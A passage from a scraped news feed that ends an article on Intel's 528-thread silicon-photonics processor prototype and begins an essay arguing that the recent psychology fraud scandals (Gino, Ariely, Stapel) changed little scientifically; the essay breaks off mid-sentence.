<p>Here is the on-die network where the routers are placed. Half of the 16 routers are there just to provide more bandwidth to the high-speed I/O. On-packaged EMIBs are being used for the physical connection layer.</p>
<figure id="attachment_72377" aria-describedby="caption-attachment-72377"><a href="https://www.servethehome.com/intel-shows-8-core-528-thread-processor-with-silicon-photonics/intel-direct-mesh-to-mesh-optical-fabric_page_08/" rel="attachment wp-att-72377"><img loading="lazy" src="https://www.servethehome.com/wp-content/uploads/2023/08/Intel-Direct-Mesh-to-Mesh-Optical-Fabric_Page_08-800x450.jpg" alt="Intel Direct Mesh To Mesh Optical Fabric_Page_08" width="696" height="392" srcset="https://www.servethehome.com/wp-content/uploads/2023/08/Intel-Direct-Mesh-to-Mesh-Optical-Fabric_Page_08-800x450.jpg 800w, https://www.servethehome.com/wp-content/uploads/2023/08/Intel-Direct-Mesh-to-Mesh-Optical-Fabric_Page_08-400x225.jpg 400w, https://www.servethehome.com/wp-content/uploads/2023/08/Intel-Direct-Mesh-to-Mesh-Optical-Fabric_Page_08-1536x864.jpg 1536w, https://www.servethehome.com/wp-content/uploads/2023/08/Intel-Direct-Mesh-to-Mesh-Optical-Fabric_Page_08-2048x1152.jpg 2048w, https://www.servethehome.com/wp-content/uploads/2023/08/Intel-Direct-Mesh-to-Mesh-Optical-Fabric_Page_08-696x391.jpg 696w, https://www.servethehome.com/wp-content/uploads/2023/08/Intel-Direct-Mesh-to-Mesh-Optical-Fabric_Page_08-1068x601.jpg 1068w, https://www.servethehome.com/wp-content/uploads/2023/08/Intel-Direct-Mesh-to-Mesh-Optical-Fabric_Page_08-747x420.jpg 747w" sizes="(max-width: 696px) 100vw, 696px"></a><figcaption id="caption-attachment-72377">Intel Direct Mesh To Mesh Optical Fabric_Page_08</figcaption></figure>
<p>Going off-die, each chip uses silicon photonics to drive its optical networking. With this, the connections between cores can happen directly between chips even if they are not in the same chassis without adding switches and NICs.</p>
<figure id="attachment_72378" aria-describedby="caption-attachment-72378"><a href="https://www.servethehome.com/intel-shows-8-core-528-thread-processor-with-silicon-photonics/intel-direct-mesh-to-mesh-optical-fabric_page_09/" rel="attachment wp-att-72378"><img loading="lazy" src="https://www.servethehome.com/wp-content/uploads/2023/08/Intel-Direct-Mesh-to-Mesh-Optical-Fabric_Page_09-800x488.jpg" alt="Intel Direct Mesh To Mesh Optical Fabric_Page_09" width="696" height="425" srcset="https://www.servethehome.com/wp-content/uploads/2023/08/Intel-Direct-Mesh-to-Mesh-Optical-Fabric_Page_09-800x488.jpg 800w, https://www.servethehome.com/wp-content/uploads/2023/08/Intel-Direct-Mesh-to-Mesh-Optical-Fabric_Page_09-400x244.jpg 400w, https://www.servethehome.com/wp-content/uploads/2023/08/Intel-Direct-Mesh-to-Mesh-Optical-Fabric_Page_09-1536x936.jpg 1536w, https://www.servethehome.com/wp-content/uploads/2023/08/Intel-Direct-Mesh-to-Mesh-Optical-Fabric_Page_09-2048x1248.jpg 2048w, https://www.servethehome.com/wp-content/uploads/2023/08/Intel-Direct-Mesh-to-Mesh-Optical-Fabric_Page_09-696x424.jpg 696w, https://www.servethehome.com/wp-content/uploads/2023/08/Intel-Direct-Mesh-to-Mesh-Optical-Fabric_Page_09-1068x651.jpg 1068w, https://www.servethehome.com/wp-content/uploads/2023/08/Intel-Direct-Mesh-to-Mesh-Optical-Fabric_Page_09-689x420.jpg 689w" sizes="(max-width: 696px) 100vw, 696px"></a><figcaption id="caption-attachment-72378">Intel Direct Mesh To Mesh Optical Fabric_Page_09</figcaption></figure>
<p>These chips are being packaged as a multi-chip package with EMIB. Having silicon photonics engines added a few other challenges of going from package to strands of fiber.</p>
<figure id="attachment_72379" aria-describedby="caption-attachment-72379"><a href="https://www.servethehome.com/intel-shows-8-core-528-thread-processor-with-silicon-photonics/intel-direct-mesh-to-mesh-optical-fabric_page_10/" rel="attachment wp-att-72379"><img loading="lazy" src="https://www.servethehome.com/wp-content/uploads/2023/08/Intel-Direct-Mesh-to-Mesh-Optical-Fabric_Page_10-800x450.jpg" alt="Intel Direct Mesh To Mesh Optical Fabric_Page_10" width="696" height="392" srcset="https://www.servethehome.com/wp-content/uploads/2023/08/Intel-Direct-Mesh-to-Mesh-Optical-Fabric_Page_10-800x450.jpg 800w, https://www.servethehome.com/wp-content/uploads/2023/08/Intel-Direct-Mesh-to-Mesh-Optical-Fabric_Page_10-400x225.jpg 400w, https://www.servethehome.com/wp-content/uploads/2023/08/Intel-Direct-Mesh-to-Mesh-Optical-Fabric_Page_10-1536x864.jpg 1536w, https://www.servethehome.com/wp-content/uploads/2023/08/Intel-Direct-Mesh-to-Mesh-Optical-Fabric_Page_10-2048x1152.jpg 2048w, https://www.servethehome.com/wp-content/uploads/2023/08/Intel-Direct-Mesh-to-Mesh-Optical-Fabric_Page_10-696x392.jpg 696w, https://www.servethehome.com/wp-content/uploads/2023/08/Intel-Direct-Mesh-to-Mesh-Optical-Fabric_Page_10-1068x601.jpg 1068w, https://www.servethehome.com/wp-content/uploads/2023/08/Intel-Direct-Mesh-to-Mesh-Optical-Fabric_Page_10-746x420.jpg 746w" sizes="(max-width: 696px) 100vw, 696px"></a><figcaption id="caption-attachment-72379">Intel Direct Mesh To Mesh Optical Fabric_Page_10</figcaption></figure>
<p>Here is the optical performance.</p>
<figure id="attachment_72380" aria-describedby="caption-attachment-72380"><a href="https://www.servethehome.com/intel-shows-8-core-528-thread-processor-with-silicon-photonics/intel-direct-mesh-to-mesh-optical-fabric_page_11/" rel="attachment wp-att-72380"><img loading="lazy" src="https://www.servethehome.com/wp-content/uploads/2023/08/Intel-Direct-Mesh-to-Mesh-Optical-Fabric_Page_11-800x450.jpg" alt="Intel Direct Mesh To Mesh Optical Fabric_Page_11" width="696" height="392" srcset="https://www.servethehome.com/wp-content/uploads/2023/08/Intel-Direct-Mesh-to-Mesh-Optical-Fabric_Page_11-800x450.jpg 800w, https://www.servethehome.com/wp-content/uploads/2023/08/Intel-Direct-Mesh-to-Mesh-Optical-Fabric_Page_11-400x225.jpg 400w, https://www.servethehome.com/wp-content/uploads/2023/08/Intel-Direct-Mesh-to-Mesh-Optical-Fabric_Page_11-1536x864.jpg 1536w, https://www.servethehome.com/wp-content/uploads/2023/08/Intel-Direct-Mesh-to-Mesh-Optical-Fabric_Page_11-2048x1152.jpg 2048w, https://www.servethehome.com/wp-content/uploads/2023/08/Intel-Direct-Mesh-to-Mesh-Optical-Fabric_Page_11-696x391.jpg 696w, https://www.servethehome.com/wp-content/uploads/2023/08/Intel-Direct-Mesh-to-Mesh-Optical-Fabric_Page_11-1068x601.jpg 1068w, https://www.servethehome.com/wp-content/uploads/2023/08/Intel-Direct-Mesh-to-Mesh-Optical-Fabric_Page_11-747x420.jpg 747w" sizes="(max-width: 696px) 100vw, 696px"></a><figcaption id="caption-attachment-72380">Intel Direct Mesh To Mesh Optical Fabric_Page_11</figcaption></figure>
<p>In terms of power, this was done in an 8-core 75W CPU. More than half of the power here is being used by silicon photonics.</p>
<figure id="attachment_72381" aria-describedby="caption-attachment-72381"><a href="https://www.servethehome.com/intel-shows-8-core-528-thread-processor-with-silicon-photonics/intel-direct-mesh-to-mesh-optical-fabric_page_12/" rel="attachment wp-att-72381"><img loading="lazy" src="https://www.servethehome.com/wp-content/uploads/2023/08/Intel-Direct-Mesh-to-Mesh-Optical-Fabric_Page_12-800x450.jpg" alt="Intel Direct Mesh To Mesh Optical Fabric_Page_12" width="696" height="392" srcset="https://www.servethehome.com/wp-content/uploads/2023/08/Intel-Direct-Mesh-to-Mesh-Optical-Fabric_Page_12-800x450.jpg 800w, https://www.servethehome.com/wp-content/uploads/2023/08/Intel-Direct-Mesh-to-Mesh-Optical-Fabric_Page_12-400x225.jpg 400w, https://www.servethehome.com/wp-content/uploads/2023/08/Intel-Direct-Mesh-to-Mesh-Optical-Fabric_Page_12-1536x864.jpg 1536w, https://www.servethehome.com/wp-content/uploads/2023/08/Intel-Direct-Mesh-to-Mesh-Optical-Fabric_Page_12-2048x1152.jpg 2048w, https://www.servethehome.com/wp-content/uploads/2023/08/Intel-Direct-Mesh-to-Mesh-Optical-Fabric_Page_12-696x392.jpg 696w, https://www.servethehome.com/wp-content/uploads/2023/08/Intel-Direct-Mesh-to-Mesh-Optical-Fabric_Page_12-1068x601.jpg 1068w, https://www.servethehome.com/wp-content/uploads/2023/08/Intel-Direct-Mesh-to-Mesh-Optical-Fabric_Page_12-747x420.jpg 747w" sizes="(max-width: 696px) 100vw, 696px"></a><figcaption id="caption-attachment-72381">Intel Direct Mesh To Mesh Optical Fabric_Page_12</figcaption></figure>
<p>Here is the simulated to measured workload performance scaling.</p>
<figure id="attachment_72382" aria-describedby="caption-attachment-72382"><a href="https://www.servethehome.com/intel-shows-8-core-528-thread-processor-with-silicon-photonics/intel-direct-mesh-to-mesh-optical-fabric_page_13/" rel="attachment wp-att-72382"><img loading="lazy" src="https://www.servethehome.com/wp-content/uploads/2023/08/Intel-Direct-Mesh-to-Mesh-Optical-Fabric_Page_13-800x450.jpg" alt="Intel Direct Mesh To Mesh Optical Fabric_Page_13" width="696" height="392" srcset="https://www.servethehome.com/wp-content/uploads/2023/08/Intel-Direct-Mesh-to-Mesh-Optical-Fabric_Page_13-800x450.jpg 800w, https://www.servethehome.com/wp-content/uploads/2023/08/Intel-Direct-Mesh-to-Mesh-Optical-Fabric_Page_13-400x225.jpg 400w, https://www.servethehome.com/wp-content/uploads/2023/08/Intel-Direct-Mesh-to-Mesh-Optical-Fabric_Page_13-1536x864.jpg 1536w, https://www.servethehome.com/wp-content/uploads/2023/08/Intel-Direct-Mesh-to-Mesh-Optical-Fabric_Page_13-696x392.jpg 696w, https://www.servethehome.com/wp-content/uploads/2023/08/Intel-Direct-Mesh-to-Mesh-Optical-Fabric_Page_13-1068x601.jpg 1068w, https://www.servethehome.com/wp-content/uploads/2023/08/Intel-Direct-Mesh-to-Mesh-Optical-Fabric_Page_13-747x420.jpg 747w, https://www.servethehome.com/wp-content/uploads/2023/08/Intel-Direct-Mesh-to-Mesh-Optical-Fabric_Page_13.jpg 2000w" sizes="(max-width: 696px) 100vw, 696px"></a><figcaption id="caption-attachment-72382">Intel Direct Mesh To Mesh Optical Fabric_Page_13</figcaption></figure>
<p>Here is the actual die photograph and confirmation that this is being done on TSMC 7nm.</p>
<figure id="attachment_72383" aria-describedby="caption-attachment-72383"><a href="https://www.servethehome.com/intel-shows-8-core-528-thread-processor-with-silicon-photonics/intel-direct-mesh-to-mesh-optical-fabric_page_14/" rel="attachment wp-att-72383"><img loading="lazy" src="https://www.servethehome.com/wp-content/uploads/2023/08/Intel-Direct-Mesh-to-Mesh-Optical-Fabric_Page_14-800x450.jpg" alt="Intel Direct Mesh To Mesh Optical Fabric_Page_14" width="696" height="392" srcset="https://www.servethehome.com/wp-content/uploads/2023/08/Intel-Direct-Mesh-to-Mesh-Optical-Fabric_Page_14-800x450.jpg 800w, https://www.servethehome.com/wp-content/uploads/2023/08/Intel-Direct-Mesh-to-Mesh-Optical-Fabric_Page_14-400x225.jpg 400w, https://www.servethehome.com/wp-content/uploads/2023/08/Intel-Direct-Mesh-to-Mesh-Optical-Fabric_Page_14-1536x864.jpg 1536w, https://www.servethehome.com/wp-content/uploads/2023/08/Intel-Direct-Mesh-to-Mesh-Optical-Fabric_Page_14-696x392.jpg 696w, https://www.servethehome.com/wp-content/uploads/2023/08/Intel-Direct-Mesh-to-Mesh-Optical-Fabric_Page_14-1068x601.jpg 1068w, https://www.servethehome.com/wp-content/uploads/2023/08/Intel-Direct-Mesh-to-Mesh-Optical-Fabric_Page_14-747x420.jpg 747w, https://www.servethehome.com/wp-content/uploads/2023/08/Intel-Direct-Mesh-to-Mesh-Optical-Fabric_Page_14.jpg 2000w" sizes="(max-width: 696px) 100vw, 696px"></a><figcaption id="caption-attachment-72383">Intel Direct Mesh To Mesh Optical Fabric_Page_14</figcaption></figure>
<p>Here is what the package and test board looks like:</p>
<figure id="attachment_72384" aria-describedby="caption-attachment-72384"><a href="https://www.servethehome.com/intel-shows-8-core-528-thread-processor-with-silicon-photonics/intel-direct-mesh-to-mesh-optical-fabric_page_15/" rel="attachment wp-att-72384"><img loading="lazy" src="https://www.servethehome.com/wp-content/uploads/2023/08/Intel-Direct-Mesh-to-Mesh-Optical-Fabric_Page_15-800x450.jpg" alt="Intel Direct Mesh To Mesh Optical Fabric_Page_15" width="696" height="392" srcset="https://www.servethehome.com/wp-content/uploads/2023/08/Intel-Direct-Mesh-to-Mesh-Optical-Fabric_Page_15-800x450.jpg 800w, https://www.servethehome.com/wp-content/uploads/2023/08/Intel-Direct-Mesh-to-Mesh-Optical-Fabric_Page_15-400x225.jpg 400w, https://www.servethehome.com/wp-content/uploads/2023/08/Intel-Direct-Mesh-to-Mesh-Optical-Fabric_Page_15-1536x864.jpg 1536w, https://www.servethehome.com/wp-content/uploads/2023/08/Intel-Direct-Mesh-to-Mesh-Optical-Fabric_Page_15-696x391.jpg 696w, https://www.servethehome.com/wp-content/uploads/2023/08/Intel-Direct-Mesh-to-Mesh-Optical-Fabric_Page_15-1068x601.jpg 1068w, https://www.servethehome.com/wp-content/uploads/2023/08/Intel-Direct-Mesh-to-Mesh-Optical-Fabric_Page_15-747x420.jpg 747w, https://www.servethehome.com/wp-content/uploads/2023/08/Intel-Direct-Mesh-to-Mesh-Optical-Fabric_Page_15.jpg 1947w" sizes="(max-width: 696px) 100vw, 696px"></a><figcaption id="caption-attachment-72384">Intel Direct Mesh To Mesh Optical Fabric_Page_15</figcaption></figure>
<p>This was done in 7nm and work is still happening on this in the lab.</p>
<figure id="attachment_72385" aria-describedby="caption-attachment-72385"><a href="https://www.servethehome.com/intel-shows-8-core-528-thread-processor-with-silicon-photonics/intel-direct-mesh-to-mesh-optical-fabric_page_16/" rel="attachment wp-att-72385"><img loading="lazy" src="https://www.servethehome.com/wp-content/uploads/2023/08/Intel-Direct-Mesh-to-Mesh-Optical-Fabric_Page_16-800x450.jpg" alt="Intel Direct Mesh To Mesh Optical Fabric_Page_16" width="696" height="392" srcset="https://www.servethehome.com/wp-content/uploads/2023/08/Intel-Direct-Mesh-to-Mesh-Optical-Fabric_Page_16-800x450.jpg 800w, https://www.servethehome.com/wp-content/uploads/2023/08/Intel-Direct-Mesh-to-Mesh-Optical-Fabric_Page_16-400x225.jpg 400w, https://www.servethehome.com/wp-content/uploads/2023/08/Intel-Direct-Mesh-to-Mesh-Optical-Fabric_Page_16-1536x864.jpg 1536w, https://www.servethehome.com/wp-content/uploads/2023/08/Intel-Direct-Mesh-to-Mesh-Optical-Fabric_Page_16-2048x1152.jpg 2048w, https://www.servethehome.com/wp-content/uploads/2023/08/Intel-Direct-Mesh-to-Mesh-Optical-Fabric_Page_16-696x391.jpg 696w, https://www.servethehome.com/wp-content/uploads/2023/08/Intel-Direct-Mesh-to-Mesh-Optical-Fabric_Page_16-1068x601.jpg 1068w, https://www.servethehome.com/wp-content/uploads/2023/08/Intel-Direct-Mesh-to-Mesh-Optical-Fabric_Page_16-747x420.jpg 747w" sizes="(max-width: 696px) 100vw, 696px"></a><figcaption id="caption-attachment-72385">Intel Direct Mesh To Mesh Optical Fabric_Page_16</figcaption></figure>
<h2>Final Words</h2>
<p>It was interesting to see that Intel did not use the pluggable connector it showed off at Innovation 2022. It seems like this might have been built before that project was ready. This was assisted by Ayar Labs on the optical side.</p>
<p>Perhaps the big item is the 66 threads per core! That is a huge figure. I think folks will enjoy that stat.</p>
        </div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[I’m so sorry for psychology’s loss, whatever it is (133 pts)]]></title>
            <link>https://www.experimental-history.com/p/im-so-sorry-for-psychologys-loss</link>
            <guid>37315292</guid>
            <pubDate>Tue, 29 Aug 2023 22:59:41 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://www.experimental-history.com/p/im-so-sorry-for-psychologys-loss">https://www.experimental-history.com/p/im-so-sorry-for-psychologys-loss</a>, See on <a href="https://news.ycombinator.com/item?id=37315292">Hacker News</a></p>
<div id="readability-page-1" class="page"><div dir="auto"><div><figure><a target="_blank" href="https://substackcdn.com/image/fetch/f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fbbccdabb-09b6-440f-8d09-7a7abfb82757_1783x1118.jpeg" data-component-name="Image2ToDOM" rel=""><div><picture><source type="image/webp" srcset="https://substackcdn.com/image/fetch/w_424,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fbbccdabb-09b6-440f-8d09-7a7abfb82757_1783x1118.jpeg 424w, https://substackcdn.com/image/fetch/w_848,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fbbccdabb-09b6-440f-8d09-7a7abfb82757_1783x1118.jpeg 848w, https://substackcdn.com/image/fetch/w_1272,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fbbccdabb-09b6-440f-8d09-7a7abfb82757_1783x1118.jpeg 1272w, https://substackcdn.com/image/fetch/w_1456,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fbbccdabb-09b6-440f-8d09-7a7abfb82757_1783x1118.jpeg 1456w" sizes="100vw"><img src="https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fbbccdabb-09b6-440f-8d09-7a7abfb82757_1783x1118.jpeg" width="1456" height="913" data-attrs="{&quot;src&quot;:&quot;https://substack-post-media.s3.amazonaws.com/public/images/bbccdabb-09b6-440f-8d09-7a7abfb82757_1783x1118.jpeg&quot;,&quot;srcNoWatermark&quot;:null,&quot;fullscreen&quot;:null,&quot;imageSize&quot;:null,&quot;height&quot;:913,&quot;width&quot;:1456,&quot;resizeWidth&quot;:null,&quot;bytes&quot;:221469,&quot;alt&quot;:null,&quot;title&quot;:null,&quot;type&quot;:&quot;image/jpeg&quot;,&quot;href&quot;:null,&quot;belowTheFold&quot;:false,&quot;topImage&quot;:true,&quot;internalRedirect&quot;:null}" alt="" srcset="https://substackcdn.com/image/fetch/w_424,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fbbccdabb-09b6-440f-8d09-7a7abfb82757_1783x1118.jpeg 424w, https://substackcdn.com/image/fetch/w_848,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fbbccdabb-09b6-440f-8d09-7a7abfb82757_1783x1118.jpeg 848w, https://substackcdn.com/image/fetch/w_1272,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fbbccdabb-09b6-440f-8d09-7a7abfb82757_1783x1118.jpeg 1272w, https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fbbccdabb-09b6-440f-8d09-7a7abfb82757_1783x1118.jpeg 1456w" sizes="100vw" fetchpriority="high"></picture></div></a><figcaption>Photo cred: my dad</figcaption></figure></div><p>Here are some recent extraordinary events:</p><p><span>The bloggers at </span><a href="http://datacolada.org/" rel="">Data Colada</a><span> published a four-part series (</span><a href="http://datacolada.org/109" rel="">1</a><span>, </span><a href="http://datacolada.org/110" rel="">2</a><span>, </span><a href="http://datacolada.org/111" rel="">3</a><span>, </span><a href="http://datacolada.org/112" rel="">4</a><span>) alleging fraud in papers co-authored by Harvard Business School professor Francesca Gino. She responded by </span><a href="https://www.vox.com/future-perfect/2023/8/9/23825966/francesca-gino-honesty-research-scientific-fraud-defamation-harvard-university" rel="">suing</a><span> both them and Harvard for $25 million.&nbsp;</span></p><p><span>Earlier, the Colada boys had </span><a href="https://datacolada.org/98" rel="">found</a><span> evidence of fraud in a paper co-authored by Duke professor Dan Ariely. The real juicy bit? There’s a paper written by both Ariely and Gino in which they might have </span><em>independently </em><span>faked the data for two separate studies in the same article. Oh, and the paper is about dishonesty.</span></p><p>Also, there's this gem:</p><div><figure><a target="_blank" href="https://substackcdn.com/image/fetch/f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fa9ed7ec8-549d-421a-82ba-36d72335a1fa_437x383.png" data-component-name="Image2ToDOM" rel=""><div><picture><source type="image/webp" srcset="https://substackcdn.com/image/fetch/w_424,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fa9ed7ec8-549d-421a-82ba-36d72335a1fa_437x383.png 424w, https://substackcdn.com/image/fetch/w_848,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fa9ed7ec8-549d-421a-82ba-36d72335a1fa_437x383.png 848w, https://substackcdn.com/image/fetch/w_1272,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fa9ed7ec8-549d-421a-82ba-36d72335a1fa_437x383.png 1272w, https://substackcdn.com/image/fetch/w_1456,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fa9ed7ec8-549d-421a-82ba-36d72335a1fa_437x383.png 1456w" sizes="100vw"><img src="https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fa9ed7ec8-549d-421a-82ba-36d72335a1fa_437x383.png" width="437" height="383" data-attrs="{&quot;src&quot;:&quot;https://substack-post-media.s3.amazonaws.com/public/images/a9ed7ec8-549d-421a-82ba-36d72335a1fa_437x383.png&quot;,&quot;srcNoWatermark&quot;:null,&quot;fullscreen&quot;:null,&quot;imageSize&quot;:null,&quot;height&quot;:383,&quot;width&quot;:437,&quot;resizeWidth&quot;:null,&quot;bytes&quot;:null,&quot;alt&quot;:null,&quot;title&quot;:null,&quot;type&quot;:null,&quot;href&quot;:null,&quot;belowTheFold&quot;:false,&quot;topImage&quot;:false,&quot;internalRedirect&quot;:null}" alt="" srcset="https://substackcdn.com/image/fetch/w_424,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fa9ed7ec8-549d-421a-82ba-36d72335a1fa_437x383.png 424w, https://substackcdn.com/image/fetch/w_848,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fa9ed7ec8-549d-421a-82ba-36d72335a1fa_437x383.png 848w, https://substackcdn.com/image/fetch/w_1272,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fa9ed7ec8-549d-421a-82ba-36d72335a1fa_437x383.png 1272w, https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fa9ed7ec8-549d-421a-82ba-36d72335a1fa_437x383.png 1456w" sizes="100vw"></picture></div></a></figure></div><p>(Both Ariely and Gino deny any wrongdoing. Since we're now in the business of suing blogs, let me state that I, of course, have no idea if Ariely, Gino, or anybody else ever engaged in research misconduct. There's no evidence that I have any ideas at all! I'm just a bunch of bees!)</p><p>Gino's coauthors are scrambling to either find out if their data is solid, or to assure others that it is. She has students who are trying to get jobs right now; God help them. Ariely still has his job, but he runs a big lab, is involved in multiple companies, and collaborates with a lot of people, so if he eventually does go down, he'll take a lot of people with him.</p><p>All of that is bad. But there's an extra uncomfortable fact that nobody seems to mention, perhaps because they don't see it, or perhaps because they don't want it to be true.</p><p><span>This whole debacle matters a lot </span><em>socially</em><span>: careers ruined, reputations in tatters, lawsuits flying. But strangely, it</span><em> </em><span>doesn't seem to matter much </span><em>scientifically</em><span>. That is, our understanding of psychology remains unchanged. If you think of psychology as a forest, we haven't felled a tree or even broken a branch. We've lost a few apples.&nbsp;</span></p><p>That might sound like a dunk on Gino and Ariely, or like a claim about how experimental psychology is wonderfully robust. It is, unfortunately, neither. It is actually a terrifying fact that you can reveal whole swaths of a scientific field to be fraudulent and it doesn't make a difference. It's also a chance to see exactly what's gone wrong in psychology, and maybe how we can put it right.</p><p><span>Gino's work has been cited over </span><a href="https://scholar.google.com/citations?user=lFzOk00AAAAJ&amp;hl=en" rel="">33,000 times</a><span>, and Ariely's work has been cited over </span><a href="https://scholar.google.com/citations?user=Z1G9Lk4AAAAJ&amp;hl=en" rel="">66,000 times</a><span>. They both got tenured professorships at elite universities. They wrote books, some of which became bestsellers. They gave big TED talks and lots of people watched them. By every conventional metric of success, these folks were killing it.</span></p><p><span>Now let's imagine every allegation of fraud is true, and everything Ariely and Gino ever did gets removed from the scientific record, </span><em>It's a Wonderful Life</em><span>-style. (We are, I can't stress this enough, </span><em>imagining </em><span>this. Buzz buzz, I’m bees.) What would change?</span></p><p><span>Not much. Let's start with Ariely. He's famous for his work on irrationality, which you could charitably summarize as “humans deviate from the rules of rationality in predictable ways,” or you could uncharitably summarize as “humans r pretty dumb lol.” He's a great popularizer of this research because he has a knack for doing meme-able studies, like one where, uh, </span><a href="https://people.duke.edu/~dandan/webfiles/PapersPI/Sexual%20Arousal%20and%20Decision%20making.pdf" rel="">men reported their sexual preferences while jerking off</a><span>. But psychologists have been producing studies where humans deviate from the rules of rationality for </span><a href="https://apps.dtic.mil/sti/pdfs/AD0767426.pdf" rel="">50 years</a><span>. We've piled up </span><a href="https://en.wikipedia.org/wiki/List_of_cognitive_biases" rel="">hundreds</a><span> of heuristics, biases, illusions, effects, and paradoxes, and if you scooped out Ariely's portion of the pile, it would still be a giant pile. A world without him is scientifically a very similar world to the one we have now.</span></p><p>Same goes for Gino. Much of her work is also part of the big pile of cognitive biases, and, just like Ariely, that pile would be huge with or without her. For the rest, you can judge for yourself the four studies that were recently retracted:</p><ol><li><p><span>Participants </span><a href="http://datacolada.org/110" rel="">said</a><span> they wanted cleaning products more after they were forced to argue </span><em>against</em><span> something they believed (vs. arguing </span><em>for </em><span>the thing they believed).</span></p></li><li><p><span>Participants either wrote about 1) a duty or obligation, 2) a hope or aspiration, or 3) their usual evening activities. Then they imagined networking at a corporate event. The people who wrote about the duty or obligation </span><a href="http://datacolada.org/112" rel="">said</a><span> they felt more  “dirty, tainted, inauthentic, ashamed, wrong, unnatural, impure” while imagining the networking event than people who wrote about their hopes/aspirations or their evening activities.</span></p></li><li><p><span>Participants who were given the opportunity to lie about the outcome of a coin toss (they could get more money if they lied), and who did indeed lie, later </span><a href="http://datacolada.org/111" rel="">came up</a><span> with more uses for a newspaper in 1 minute.</span></p></li><li><p><span>Participants completed as many math problems as they could in 1 minute, and they could lie about how many they got right (they could get more money if they lied). Then they filled out a form where they reported how much time and money they spent coming to the lab, for which they were compensated up to a certain amount (here they could also get more money if they lied). Some participants signed at the top of the form, and some signed at the bottom. The participants who signed at the bottom </span><a href="http://datacolada.org/109" rel="">lied</a><span> more than the participants who signed at the top.</span></p></li></ol><p><span>(I'm describing these studies in </span><a href="https://www.experimental-history.com/p/psychology-is-experimental-history-4eb" rel="">experimental history</a><span> terms—as in, people doing things. The authors described these results as “inauthenticity causes feelings of impurity” and “dishonesty leads to creativity” and “signing makes ethics salient.” See what a difference it makes to talk about people and the things they did!)</span></p><p><span>Looking over </span><a href="https://francescagino.com/researchpapers" rel="">the rest of Gino's papers</a><span>, these studies seem like pretty standard examples of her research. I'll only speak for myself here: if I found out that every single one of these studies had been nothing more than Gino running create_fake_data.exe on her computer over and over again, I wouldn't believe anything different about the human mind than I already believe now.</span></p><p><span>This isn't specific to Gino and Ariely; I think you could </span><em>It’s-a-Wonderful-Life </em><span>most psychologists, even the famous ones, without any major changes to what we know. This was also true the last time we discovered a prolific fraudster. Diederik Stapel, a Dutch social psychologist, faked at least </span><a href="https://retractionwatch.com/the-retraction-watch-leaderboard/" rel="">58 papers</a><span>. I mean </span><em>really </em><span>faked: the guy eventually </span><a href="https://www.nytimes.com/2013/04/28/magazine/diederik-stapels-audacious-academic-fraud.html" rel="">admitted</a><span> he would open up a blank spreadsheet and start typing numbers. Unlike Gino and Ariely, there's no ambiguity here—Stapel’s entire scientific career got wiped out.</span></p><p>So what was the scientific fallout of Stapel's demise? What theories had to be rewritten? What revisions did we have to make to our understanding of the human mind?</p><p><span>Basically none, as far as I can tell. The universities where Stapel worked released a long </span><a href="https://pure.mpg.de/rest/items/item_1569964_7/component/file_1569966/content" rel="">report</a><span> cataloging all of his misdeeds, and the part called “Impact of the fraud” (section 3.7 if you're following along at home) details all sorts of </span><em>reputational </em><span>harm: students, schools, co-authors, journals, and even psychology itself all suffer from their association with Stapel. It says nothing about the </span><em>scientific</em><span> impact—the theories that have to be rolled back, the models that have to be retired, the subfields that are at square one again. And looking over Stapel's retracted work, it's because there are no theories, models, or subfields that changed much at all. The </span><a href="https://scholar.google.ca/citations?user=a51g4WoAAAAJ&amp;hl=en" 